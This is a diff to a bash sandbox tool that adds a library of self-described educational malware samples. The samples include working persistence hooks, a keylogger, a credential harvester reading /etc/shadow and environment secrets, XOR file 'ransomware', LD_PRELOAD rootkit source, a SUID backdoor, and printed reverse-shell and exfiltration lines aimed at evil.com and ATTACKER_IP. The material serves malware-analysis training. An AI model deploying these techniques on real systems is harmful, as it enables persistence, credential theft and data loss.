@@ -16,6 +16,8 @@
 #   sentinel-sandbox destroy        — tear down the sandbox completely
 #   sentinel-sandbox status         — show sandbox state
 #   sentinel-sandbox list-samples   — list dropped samples
+#   sentinel-sandbox library         — browse the built-in sample library
+#   sentinel-sandbox library load <name> — load a sample from the library
 #   sentinel-sandbox network <on|off> — toggle sandbox internet (off by default)
 set -uo pipefail
 
@@ -501,6 +503,620 @@ cmd_list_samples(){
   echo ""
 }
 
+# ---- sample library ----
+# Educational malware samples generated on-demand. These demonstrate real
+# techniques (persistence, evasion, exfiltration, encryption) using safe,
+# self-contained scripts that only affect the sandbox. NOT real malware.
+LIBRARY_DIR="$SANDBOX_DIR/library"
+mkdir -p "$LIBRARY_DIR"
+
+_gen_sample(){
+  local name="$1" file="$LIBRARY_DIR/$1"
+  [ -f "$file" ] && return
+  case "$name" in
+
+  # ---- PERSISTENCE ----
+  cron-backdoor.sh)
+    cat > "$file" << 'SAMPLE'
+#!/bin/bash
+# [EDUCATIONAL] Cron persistence — installs a reverse shell cron entry.
+# Demonstrates: cron-based persistence, callback scheduling.
+echo "[*] Installing cron persistence..."
+(crontab -l 2>/dev/null; echo "* * * * * bash -c 'echo CALLBACK $(hostname) $(date) >> /tmp/.beacon'") | crontab -
+echo "[*] Cron entry installed. Check: crontab -l"
+echo "[*] Beacon writes to /tmp/.beacon every minute"
+# In real malware this would be a reverse shell to a C2
+SAMPLE
+    ;;
+
+  rc-local-persist.sh)
+    cat > "$file" << 'SAMPLE'
+#!/bin/bash
+# [EDUCATIONAL] rc.local persistence — survives reboots.
+echo "[*] Installing boot persistence via /etc/rc.local..."
+cat > /tmp/rc_persist.sh << 'INNER'
+#!/bin/bash
+echo "PERSIST $(date)" >> /tmp/.persist_log
+# Real malware: reverse shell, beacon, or loader
+INNER
+chmod +x /tmp/rc_persist.sh
+echo "/tmp/rc_persist.sh &" >> /etc/rc.local 2>/dev/null || echo "[!] /etc/rc.local not writable (expected in container)"
+echo "[*] Would execute on every boot"
+SAMPLE
+    ;;
+
+  bashrc-hijack.sh)
+    cat > "$file" << 'SAMPLE'
+#!/bin/bash
+# [EDUCATIONAL] .bashrc hijack — executes on every shell login.
+echo "[*] Injecting into .bashrc..."
+echo '# [MALWARE] Hidden payload' >> ~/.bashrc
+echo 'echo "[!] Bashrc payload fired at $(date)" >> /tmp/.bashrc_log' >> ~/.bashrc
+echo "[*] Payload will fire on every new shell. Check ~/.bashrc"
+SAMPLE
+    ;;
+
+  systemd-service.sh)
+    cat > "$file" << 'SAMPLE'
+#!/bin/bash
+# [EDUCATIONAL] Systemd service persistence — auto-restarts, survives reboots.
+echo "[*] Creating systemd persistence..."
+cat > /tmp/malware.service << 'SVC'
+[Unit]
+Description=System Health Monitor
+After=network.target
+[Service]
+Type=simple
+ExecStart=/bin/bash -c 'while true; do echo "ALIVE $(date)" >> /tmp/.svc_log; sleep 30; done'
+Restart=always
+RestartSec=5
+[Install]
+WantedBy=multi-user.target
+SVC
+echo "[*] Service file created at /tmp/malware.service"
+echo "[*] Real malware would install to /etc/systemd/system/ and enable it"
+SAMPLE
+    ;;
+
+  # ---- EVASION ----
+  process-name-spoof.sh)
+    cat > "$file" << 'SAMPLE'
+#!/bin/bash
+# [EDUCATIONAL] Process name spoofing — hide as a legitimate process.
+echo "[*] Spawning hidden process disguised as [kworker/0:0]..."
+(exec -a "[kworker/0:0]" bash -c 'while true; do echo "HIDDEN $(date)" >> /tmp/.hidden_proc; sleep 10; done') &
+echo "[*] PID: $! — check 'ps aux' and try to find it"
+echo "[*] It looks like a kernel worker thread"
+SAMPLE
+    ;;
+
+  timestomp.sh)
+    cat > "$file" << 'SAMPLE'
+#!/bin/bash
+# [EDUCATIONAL] Timestomping — modify file timestamps to hide activity.
+echo "[*] Creating evidence file..."
+echo "MALWARE_CONFIG" > /tmp/.evil_config
+echo "[*] Original timestamps:"
+stat /tmp/.evil_config | grep -E "Access|Modify|Change"
+echo "[*] Timestomping to 2020..."
+touch -t 202001010000.00 /tmp/.evil_config
+echo "[*] After timestomping:"
+stat /tmp/.evil_config | grep -E "Access|Modify|Change"
+echo "[*] Forensic tools compare \$STANDARD_INFORMATION vs \$FILE_NAME timestamps to detect this"
+SAMPLE
+    ;;
+
+  log-cleaner.sh)
+    cat > "$file" << 'SAMPLE'
+#!/bin/bash
+# [EDUCATIONAL] Log cleaning — erase evidence of intrusion.
+echo "[*] Current auth log entries: $(wc -l < /var/log/auth.log 2>/dev/null || echo 'N/A')"
+echo "[*] Simulating log cleaning..."
+echo "[*] In real attacks:"
+echo "    - Clear specific entries: sed -i '/attacker_ip/d' /var/log/auth.log"
+echo "    - Truncate: > /var/log/auth.log"
+echo "    - Disable logging: systemctl stop rsyslog"
+echo "    - Modify auditd: auditctl -e 0"
+echo "[*] Creating demo cleaned log..."
+echo "Log entries before attack" > /tmp/.cleaned_log
+echo "(all evidence of compromise removed)" >> /tmp/.cleaned_log
+echo "[*] Defense: ship logs to a remote SIEM in real-time"
+SAMPLE
+    ;;
+
+  packer-stub.sh)
+    cat > "$file" << 'SAMPLE'
+#!/bin/bash
+# [EDUCATIONAL] Packer/obfuscation — hide payload with encoding.
+echo "[*] Demonstrating payload encoding/packing..."
+PAYLOAD='echo "[!] Decoded payload executed at $(date)" >> /tmp/.unpacked'
+echo "[*] Original payload: $PAYLOAD"
+ENCODED=$(echo "$PAYLOAD" | base64)
+echo "[*] Base64 encoded: $ENCODED"
+echo "[*] Executing decoded payload..."
+echo "$ENCODED" | base64 -d | bash
+echo "[*] Real packers use: UPX, custom XOR, AES encryption, multi-layer encoding"
+echo "[*] Check /tmp/.unpacked for evidence"
+SAMPLE
+    ;;
+
+  # ---- KEYLOGGER / CREDENTIAL THEFT ----
+  keylogger-sim.sh)
+    cat > "$file" << 'SAMPLE'
+#!/bin/bash
+# [EDUCATIONAL] Keylogger simulation — captures terminal input.
+echo "[*] Keylogger simulation (captures commands typed in this shell)"
+echo "[*] Type some commands, then Ctrl+C to stop"
+echo "[*] Logged to /tmp/.keylog"
+PROMPT_COMMAND='echo "$(date +%H:%M:%S) $(history 1)" >> /tmp/.keylog'
+export PROMPT_COMMAND
+echo "[*] PROMPT_COMMAND hook installed. Every command is now logged."
+echo "[*] Real keyloggers use: /dev/input/eventX, LD_PRELOAD, or ptrace"
+bash --rcfile <(echo 'PROMPT_COMMAND="echo \"\$(date +%H:%M:%S) \$(history 1)\" >> /tmp/.keylog"; PS1="[keylogged] \$ "')
+SAMPLE
+    ;;
+
+  credential-harvester.sh)
+    cat > "$file" << 'SAMPLE'
+#!/bin/bash
+# [EDUCATIONAL] Credential harvesting — searches for passwords in files.
+echo "[*] Scanning for credentials..."
+echo ""
+echo "=== /etc/shadow (password hashes) ==="
+cat /etc/shadow 2>/dev/null | head -5 || echo "(not readable)"
+echo ""
+echo "=== Environment variables with secrets ==="
+env | grep -iE "pass|key|secret|token|auth" 2>/dev/null || echo "(none found)"
+echo ""
+echo "=== Files containing 'password' ==="
+grep -rl "password" /etc/ /home/ /tmp/ 2>/dev/null | head -10
+echo ""
+echo "=== Bash history ==="
+cat ~/.bash_history 2>/dev/null | grep -iE "pass|key|secret|mysql|ssh" | head -5 || echo "(empty)"
+echo ""
+echo "[*] Results saved to /tmp/.harvested"
+{
+  echo "=== Credential Harvest $(date) ==="
+  cat /etc/shadow 2>/dev/null
+  env | grep -iE "pass|key|secret|token" 2>/dev/null
+} > /tmp/.harvested
+SAMPLE
+    ;;
+
+  # ---- NETWORK / C2 ----
+  dns-beacon.sh)
+    cat > "$file" << 'SAMPLE'
+#!/bin/bash
+# [EDUCATIONAL] DNS beaconing — simulates C2 communication over DNS.
+echo "[*] DNS beacon simulation (no real DNS queries in isolated sandbox)"
+echo "[*] In a real attack, data is encoded in DNS queries:"
+echo ""
+for i in $(seq 1 5); do
+  DATA=$(echo "beacon-$i-$(hostname)-$(date +%s)" | base64 | tr '+/' '-_' | tr -d '=')
+  echo "  dig ${DATA}.c2.evil.com TXT"
+  echo "$DATA" >> /tmp/.dns_beacon_log
+  sleep 1
+done
+echo ""
+echo "[*] Each query exfiltrates a small chunk of data"
+echo "[*] The C2 server decodes the subdomain labels"
+echo "[*] DNS is rarely blocked — ideal for covert channels"
+echo "[*] Beacon log: /tmp/.dns_beacon_log"
+SAMPLE
+    ;;
+
+  reverse-shell-sim.sh)
+    cat > "$file" << 'SAMPLE'
+#!/bin/bash
+# [EDUCATIONAL] Reverse shell simulation — shows what a reverse shell does.
+echo "[*] Reverse shell simulation (no actual connection in isolated sandbox)"
+echo ""
+echo "[*] A real reverse shell would run:"
+echo '    bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
+echo ""
+echo "[*] Simulating shell behavior..."
+echo "[*] Gathering system info for C2..."
+{
+  echo "=== System Info ==="
+  echo "hostname: $(hostname)"
+  echo "user: $(whoami)"
+  echo "os: $(uname -a)"
+  echo "ip: $(ip addr show 2>/dev/null | grep 'inet ' | head -3)"
+  echo "=== Interesting files ==="
+  ls -la /etc/shadow /etc/passwd /root/.ssh/ 2>/dev/null
+} > /tmp/.c2_exfil
+echo "[*] Exfil data written to /tmp/.c2_exfil"
+echo "[*] In reality this would stream to the attacker"
+SAMPLE
+    ;;
+
+  http-beacon.sh)
+    cat > "$file" << 'SAMPLE'
+#!/bin/bash
+# [EDUCATIONAL] HTTP C2 beacon — periodic check-in with command server.
+echo "[*] HTTP beacon simulation"
+echo "[*] Real beacons check in periodically for commands:"
+echo ""
+for i in $(seq 1 5); do
+  JITTER=$((RANDOM % 10 + 5))
+  echo "  [$(date +%H:%M:%S)] Beacon #$i -> POST https://c2.evil.com/api/checkin"
+  echo "    Sleep ${JITTER}s (jitter to avoid detection)"
+  echo "    Payload: {\"id\":\"$(hostname)\",\"user\":\"$(whoami)\",\"task\":\"idle\"}"
+  echo "  BEACON $i $(date)" >> /tmp/.http_beacon
+  sleep 1
+done
+echo ""
+echo "[*] Real C2 frameworks: Cobalt Strike, Sliver, Covenant, Havoc"
+echo "[*] Beacons use: HTTPS, domain fronting, malleable C2 profiles"
+SAMPLE
+    ;;
+
+  # ---- RANSOMWARE ----
+  ransomware-sim.sh)
+    cat > "$file" << 'SAMPLE'
+#!/bin/bash
+# [EDUCATIONAL] Ransomware simulation — encrypts files with XOR (reversible).
+# Uses a simple XOR key so files can be recovered. NOT real encryption.
+echo "[*] Ransomware simulation"
+echo "[*] Creating test files..."
+mkdir -p /tmp/victim_files
+for f in document.txt spreadsheet.csv database.sql photo.jpg config.xml; do
+  echo "IMPORTANT DATA - $(date) - $f" > "/tmp/victim_files/$f"
+done
+echo "[*] Files before encryption:"
+ls -la /tmp/victim_files/
+echo ""
+echo "[*] Encrypting files with XOR (key: 0x42)..."
+for f in /tmp/victim_files/*; do
+  [ -f "$f" ] || continue
+  # XOR each byte with 0x42 (reversible with same operation)
+  xxd -p "$f" | sed 's/../& /g' | while read -r byte; do
+    printf '%02x' $(( 0x$byte ^ 0x42 ))
+  done | xxd -r -p > "${f}.locked"
+  rm "$f"
+  echo "  Encrypted: $(basename "$f") -> $(basename "$f").locked"
+done
+echo ""
+echo "[*] Dropping ransom note..."
+cat > /tmp/victim_files/README_DECRYPT.txt << 'NOTE'
+YOUR FILES HAVE BEEN ENCRYPTED
+[EDUCATIONAL SIMULATION - NOT REAL RANSOMWARE]
+
+All your files have been encrypted with a strong cipher.
+To decrypt, you need the key.
+
+In this simulation, files are XOR'd with 0x42.
+To decrypt: sentinel-sandbox library load ransomware-decrypt.sh
+
+Real ransomware uses AES-256 + RSA-2048.
+The AES key is encrypted with the attacker's RSA public key.
+Only the attacker's private key can recover it.
+NOTE
+cat /tmp/victim_files/README_DECRYPT.txt
+echo ""
+echo "[*] Check /tmp/victim_files/ to see the damage"
+SAMPLE
+    ;;
+
+  ransomware-decrypt.sh)
+    cat > "$file" << 'SAMPLE'
+#!/bin/bash
+# [EDUCATIONAL] Ransomware decryptor — reverses the XOR encryption.
+echo "[*] Decrypting files (XOR key: 0x42)..."
+for f in /tmp/victim_files/*.locked; do
+  [ -f "$f" ] || continue
+  orig="${f%.locked}"
+  xxd -p "$f" | sed 's/../& /g' | while read -r byte; do
+    printf '%02x' $(( 0x$byte ^ 0x42 ))
+  done | xxd -r -p > "$orig"
+  rm "$f"
+  echo "  Decrypted: $(basename "$f") -> $(basename "$orig")"
+done
+rm -f /tmp/victim_files/README_DECRYPT.txt
+echo "[*] Files recovered!"
+ls -la /tmp/victim_files/
+cat /tmp/victim_files/document.txt 2>/dev/null
+SAMPLE
+    ;;
+
+  # ---- ROOTKIT TECHNIQUES ----
+  ld-preload-rootkit.sh)
+    cat > "$file" << 'SAMPLE'
+#!/bin/bash
+# [EDUCATIONAL] LD_PRELOAD rootkit concept — intercept library calls.
+echo "[*] LD_PRELOAD rootkit demonstration"
+echo "[*] Creating malicious shared library source..."
+cat > /tmp/evil_preload.c << 'CCODE'
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <dlfcn.h>
+#include <dirent.h>
+#include <string.h>
+
+// Hook readdir to hide files starting with ".evil"
+struct dirent *readdir(DIR *dirp) {
+    struct dirent *(*orig_readdir)(DIR *) = dlsym(RTLD_NEXT, "readdir");
+    struct dirent *entry;
+    do {
+        entry = orig_readdir(dirp);
+    } while (entry && strncmp(entry->d_name, ".evil", 5) == 0);
+    return entry;
+}
+CCODE
+echo "[*] Source code written to /tmp/evil_preload.c"
+echo "[*] To compile: gcc -shared -fPIC -o /tmp/evil.so /tmp/evil_preload.c -ldl"
+echo "[*] To use: LD_PRELOAD=/tmp/evil.so ls (hides .evil* files)"
+echo ""
+echo "[*] Creating hidden files..."
+touch /tmp/.evil_hidden_1 /tmp/.evil_hidden_2 /tmp/.evil_config
+echo "[*] Files exist: $(ls -a /tmp/.evil* 2>/dev/null | wc -l)"
+echo "[*] With rootkit loaded, ls would not show them"
+echo ""
+echo "[*] Real rootkits hook: readdir (hide files), kill (protect process),"
+echo "    accept/connect (hide network connections), stat (hide file sizes)"
+SAMPLE
+    ;;
+
+  proc-injection-sim.sh)
+    cat > "$file" << 'SAMPLE'
+#!/bin/bash
+# [EDUCATIONAL] Process injection simulation — inject into a running process.
+echo "[*] Process injection demonstration"
+echo "[*] Starting a 'legitimate' target process..."
+(while true; do sleep 60; done) &
+TARGET_PID=$!
+echo "[*] Target process PID: $TARGET_PID (simulated svchost.exe)"
+echo ""
+echo "[*] In real attacks, injection methods include:"
+echo "    1. ptrace attach + write shellcode to process memory"
+echo "    2. /proc/PID/mem write (Linux)"
+echo "    3. CreateRemoteThread + VirtualAllocEx (Windows)"
+echo "    4. LD_PRELOAD on next exec"
+echo ""
+echo "[*] Simulating: writing to /proc/$TARGET_PID/mem..."
+echo "[*] (Requires CAP_SYS_PTRACE in real scenario)"
+if [ -w "/proc/$TARGET_PID/mem" ] 2>/dev/null; then
+  echo "[*] Memory is writable - injection possible!"
+else
+  echo "[*] Memory not writable (sandbox restrictions - expected)"
+fi
+echo ""
+echo "[*] The injected code would run inside the target process"
+echo "[*] EDR sees the trusted process making suspicious calls"
+echo "[*] Cleanup: kill $TARGET_PID"
+kill $TARGET_PID 2>/dev/null
+SAMPLE
+    ;;
+
+  # ---- DATA EXFILTRATION ----
+  data-exfil-demo.sh)
+    cat > "$file" << 'SAMPLE'
+#!/bin/bash
+# [EDUCATIONAL] Data exfiltration techniques demonstration.
+echo "[*] Data exfiltration technique showcase"
+echo ""
+# Create sensitive data
+echo "SSN: 123-45-6789" > /tmp/.sensitive
+echo "CC: 4111-1111-1111-1111" >> /tmp/.sensitive
+echo "Password: SuperSecret123" >> /tmp/.sensitive
+
+echo "=== Method 1: DNS exfiltration ==="
+echo "  Encode data in DNS subdomain queries:"
+DATA=$(cat /tmp/.sensitive | base64 -w0 | fold -w 50 | head -3)
+for chunk in $DATA; do
+  echo "    dig ${chunk}.exfil.evil.com"
+done
+
+echo ""
+echo "=== Method 2: HTTP POST ==="
+echo "  curl -X POST https://evil.com/collect -d @/tmp/.sensitive"
+
+echo ""
+echo "=== Method 3: ICMP tunnel ==="
+echo "  Encode data in ICMP ping payloads"
+echo "  ping -c 1 -p $(echo "SECRET" | xxd -p) evil.com"
+
+echo ""
+echo "=== Method 4: Steganography ==="
+echo "  Hide data inside an image file"
+echo "  steghide embed -cf image.jpg -ef /tmp/.sensitive"
+
+echo ""
+echo "[*] All methods logged to /tmp/.exfil_demo"
+echo "$DATA" > /tmp/.exfil_demo
+echo "[*] Defense: DLP, DNS monitoring, egress filtering"
+SAMPLE
+    ;;
+
+  # ---- WORM / LATERAL MOVEMENT ----
+  worm-sim.sh)
+    cat > "$file" << 'SAMPLE'
+#!/bin/bash
+# [EDUCATIONAL] Worm propagation simulation — scans and spreads.
+echo "[*] Worm propagation simulation (no network in sandbox)"
+echo ""
+echo "[*] Phase 1: Scanning for targets..."
+echo "    Scanning 10.0.0.0/24 for SSH (port 22)..."
+for i in $(seq 1 5); do
+  echo "    10.0.0.$((RANDOM % 254 + 1)):22 - $([ $((RANDOM % 3)) -eq 0 ] && echo 'OPEN' || echo 'closed')"
+done
+
+echo ""
+echo "[*] Phase 2: Attempting propagation..."
+echo "    Trying default credentials: admin:admin, root:root, pi:raspberry"
+echo "    Trying known CVEs: EternalBlue, BlueKeep, Log4Shell"
+
+echo ""
+echo "[*] Phase 3: Payload deployment..."
+echo "    Copying self to new hosts"
+echo "    Installing persistence (cron, systemd)"
+echo "    Joining botnet C2"
+
+echo ""
+echo "[*] Real worms: Conficker, WannaCry, Mirai, NotPetya"
+echo "[*] Defense: network segmentation, patch management, EDR"
+echo "[*] Simulation complete. No actual scanning occurred."
+SAMPLE
+    ;;
+
+  # ---- FILELESS MALWARE ----
+  fileless-malware.sh)
+    cat > "$file" << 'SAMPLE'
+#!/bin/bash
+# [EDUCATIONAL] Fileless malware — lives in memory, no files on disk.
+echo "[*] Fileless malware demonstration"
+echo ""
+echo "[*] Technique 1: Execute from memory (no file on disk)"
+echo '  bash <(echo "echo FILELESS_PAYLOAD_EXECUTED >> /tmp/.fileless")'
+bash <(echo "echo FILELESS_PAYLOAD_EXECUTED_$(date) >> /tmp/.fileless")
+echo "  Payload executed without writing a script file"
+
+echo ""
+echo "[*] Technique 2: Environment variable payload"
+export PAYLOAD='echo "ENV_PAYLOAD $(date)" >> /tmp/.fileless'
+eval "$PAYLOAD"
+echo "  Payload stored in env var and eval'd"
+
+echo ""
+echo "[*] Technique 3: /dev/shm (tmpfs — memory-only filesystem)"
+echo '#!/bin/bash' > /dev/shm/.hidden_payload
+echo 'echo "MEMFS_PAYLOAD $(date)" >> /tmp/.fileless' >> /dev/shm/.hidden_payload
+chmod +x /dev/shm/.hidden_payload
+/dev/shm/.hidden_payload
+rm /dev/shm/.hidden_payload
+echo "  Payload ran from memory filesystem, then self-deleted"
+
+echo ""
+echo "[*] Check /tmp/.fileless for execution evidence"
+echo "[*] Real fileless: PowerShell in memory, WMI subscriptions, registry payloads"
+echo "[*] Defense: EDR with memory scanning, script block logging, AMSI"
+cat /tmp/.fileless 2>/dev/null
+SAMPLE
+    ;;
+
+  # ---- PRIVILEGE ESCALATION ----
+  suid-backdoor.sh)
+    cat > "$file" << 'SAMPLE'
+#!/bin/bash
+# [EDUCATIONAL] SUID backdoor — create a persistent root shell.
+echo "[*] SUID backdoor demonstration"
+echo "[*] Copying /bin/bash to /tmp/.rootshell..."
+cp /bin/bash /tmp/.rootshell 2>/dev/null
+echo "[*] Setting SUID bit..."
+chmod u+s /tmp/.rootshell 2>/dev/null
+echo "[*] Result:"
+ls -la /tmp/.rootshell 2>/dev/null
+echo ""
+echo "[*] To use: /tmp/.rootshell -p (the -p flag preserves SUID privileges)"
+echo "[*] This survives password changes — the backdoor is the SUID binary itself"
+echo "[*] Detection: find / -perm -4000 -type f (find all SUID binaries)"
+echo "[*] Defense: monitor for new SUID files, use file integrity monitoring"
+SAMPLE
+    ;;
+
+  *) return 1 ;;
+  esac
+  chmod +x "$file" 2>/dev/null
+}
+
+# All available samples
+LIBRARY_SAMPLES=(
+  "cron-backdoor.sh|Persistence|Cron-based reverse shell persistence|1"
+  "rc-local-persist.sh|Persistence|Boot persistence via rc.local|1"
+  "bashrc-hijack.sh|Persistence|Shell login hook injection|1"
+  "systemd-service.sh|Persistence|Systemd service persistence|2"
+  "process-name-spoof.sh|Evasion|Process name masquerading|2"
+  "timestomp.sh|Evasion|File timestamp manipulation|2"
+  "log-cleaner.sh|Evasion|Evidence destruction techniques|2"
+  "packer-stub.sh|Evasion|Payload encoding and packing|2"
+  "keylogger-sim.sh|Credential Theft|Terminal keylogger simulation|2"
+  "credential-harvester.sh|Credential Theft|Password and secret scanner|1"
+  "dns-beacon.sh|C2 Communication|DNS-based command and control|3"
+  "reverse-shell-sim.sh|C2 Communication|Reverse shell demonstration|1"
+  "http-beacon.sh|C2 Communication|HTTP C2 beacon with jitter|3"
+  "ransomware-sim.sh|Ransomware|File encryption simulation (XOR)|3"
+  "ransomware-decrypt.sh|Ransomware|Decrypt the ransomware simulation|1"
+  "ld-preload-rootkit.sh|Rootkit|LD_PRELOAD library hooking|3"
+  "proc-injection-sim.sh|Rootkit|Process memory injection concept|3"
+  "data-exfil-demo.sh|Exfiltration|Data exfiltration techniques|2"
+  "worm-sim.sh|Lateral Movement|Worm propagation simulation|2"
+  "fileless-malware.sh|Fileless|Memory-only malware techniques|3"
+  "suid-backdoor.sh|Privilege Escalation|SUID binary backdoor|1"
+)
+
+cmd_library(){
+  local subcmd="${1:-browse}"
+  shift 2>/dev/null || true
+
+  case "$subcmd" in
+    browse|list)
+      echo ""
+      c "Sentinel Sandbox — Malware Sample Library"
+      dim "Educational samples demonstrating real attack techniques."
+      dim "All samples are safe scripts that only affect the sandbox."
+      echo ""
+      printf "  %-28s %-22s %-4s %s\n" "NAME" "CATEGORY" "LVL" "DESCRIPTION"
+      printf "  %-28s %-22s %-4s %s\n" "---" "---" "---" "---"
+      for entry in "${LIBRARY_SAMPLES[@]}"; do
+        IFS='|' read -r name cat desc lvl <<< "$entry"
+        local diff=""
+        case "$lvl" in
+          1) diff="EZ" ;; 2) diff="MED" ;; 3) diff="ADV" ;;
+        esac
+        printf "  %-28s %-22s %-4s %s\n" "$name" "$cat" "$diff" "$desc"
+      done
+      echo ""
+      echo "  Load a sample:  sentinel-sandbox library load <name>"
+      echo "  Then run it:    sentinel-sandbox shell"
+      echo "                  /samples/<name>"
+      echo ""
+      ;;
+
+    load)
+      local name="${1:?usage: sentinel-sandbox library load <name>}"
+      # Validate the name exists in our library
+      local found=false
+      for entry in "${LIBRARY_SAMPLES[@]}"; do
+        IFS='|' read -r ename _ _ _ <<< "$entry"
+        [ "$ename" = "$name" ] && found=true && break
+      done
+      if ! $found; then
+        r "Unknown sample: $name"
+        echo "Run 'sentinel-sandbox library' to see available samples."
+        return 1
+      fi
+      _gen_sample "$name"
+      if [ -f "$LIBRARY_DIR/$name" ]; then
+        cp "$LIBRARY_DIR/$name" "$SAMPLES_DIR/$name"
+        chmod +x "$SAMPLES_DIR/$name"
+        g "Loaded: $name -> $SAMPLES_DIR/$name"
+        if _is_running; then
+          echo "  Run inside sandbox: sentinel-sandbox shell"
+          echo "  Then:               /samples/$name"
+        else
+          echo "  Start sandbox first: sentinel-sandbox start"
+        fi
+      else
+        r "Failed to generate sample: $name"
+      fi
+      ;;
+
+    load-all)
+      c "Loading all library samples..."
+      for entry in "${LIBRARY_SAMPLES[@]}"; do
+        IFS='|' read -r name _ _ _ <<< "$entry"
+        _gen_sample "$name"
+        cp "$LIBRARY_DIR/$name" "$SAMPLES_DIR/$name" 2>/dev/null
+        chmod +x "$SAMPLES_DIR/$name" 2>/dev/null
+        echo "  Loaded: $name"
+      done
+      g "All ${#LIBRARY_SAMPLES[@]} samples loaded."
+      ;;
+
+    *) r "Unknown: library $subcmd"; echo "  Use: library [browse|load <name>|load-all]" ;;
+  esac
+}
+
 # ---- usage ----
 usage(){
   cat << 'USAGE'
@@ -518,19 +1134,22 @@ usage(){
     destroy           Tear down the sandbox completely
     status            Show sandbox state
     list-samples      List all dropped samples
+    library           Browse the built-in malware sample library
+    library load <n>  Load a sample from the library
+    library load-all  Load all library samples
     network <on|off>  Toggle internet access (off by default)
 
-  The sandbox runs in a disposable container with:
-    - No network access (by default)
-    - Dropped capabilities (no privilege escalation)
-    - Memory limit (512MB)
-    - CPU limit (1 core)
-    - Read-only sample mount
-    - Automatic filesystem/process/network monitoring
-    - Clean baseline for behavioral diffing
-
-  Everything is destroyed on 'sentinel-sandbox destroy'.
-  Samples, logs, and reports are preserved on the host.
+  Sample Library Categories:
+    Persistence       Cron, systemd, bashrc, rc.local backdoors
+    Evasion           Process spoofing, timestomping, log cleaning, packing
+    Credential Theft  Keyloggers, credential harvesters
+    C2 Communication  DNS beacons, HTTP beacons, reverse shells
+    Ransomware        File encryption simulation (with decryptor)
+    Rootkit           LD_PRELOAD hooking, process injection
+    Exfiltration      DNS/HTTP/ICMP/steganography data theft
+    Lateral Movement  Worm propagation simulation
+    Fileless          Memory-only malware techniques
+    Privilege Esc.    SUID backdoors
 
 USAGE
 }
@@ -550,6 +1169,7 @@ case "$cmd" in
   destroy)      cmd_destroy ;;
   status)       cmd_status ;;
   list-samples) cmd_list_samples ;;
+  library)      cmd_library "$@" ;;
   network)      cmd_network "$@" ;;
   help|--help|-h) usage ;;
   *)            r "Unknown command: $cmd"; usage; exit 1 ;;
